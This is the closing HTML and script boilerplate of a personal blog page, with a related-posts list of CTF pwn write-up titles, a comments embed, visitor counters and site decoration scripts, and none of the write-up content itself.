	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/2025bjtuctf-pwn/">
        
        
            <div class="article-image">
                <img src="/p/2025bjtuctf-pwn/BJTUCTF.90f5cd42e21881be44253e37d54b6795_hu_13bcc8b29ab9b122.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post 2025BJTUCTF-PWN"
                        
                        data-hash="md5-kPXNQuIYgb5EJT431UtnlQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2025BJTUCTF-PWN</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-6/">
        
        
            <div class="article-image">
                <img src="/p/pwn-6/PWN6.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-6"
                        
                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-6</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-4/">
        
        
            <div class="article-image">
                <img src="/p/pwn-4/PWN4.039bba6854d55d814eda5d84e9c52391_hu_1ec51b34ddcc39a6.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-4"
                        
                        data-hash="md5-A5u6aFTVXYFO2l2E6cUjkQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-4</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-5/">
        
        
            <div class="article-image">
                
                    <img src="/PWN5.png" loading="lazy" data-key="" data-hash="/PWN5.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-5</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-3/">
        
        
            <div class="article-image">
                <img src="/p/pwn-3/PWN3.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-3"
                        
                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-3</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        





















































        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†21ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±289.13k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
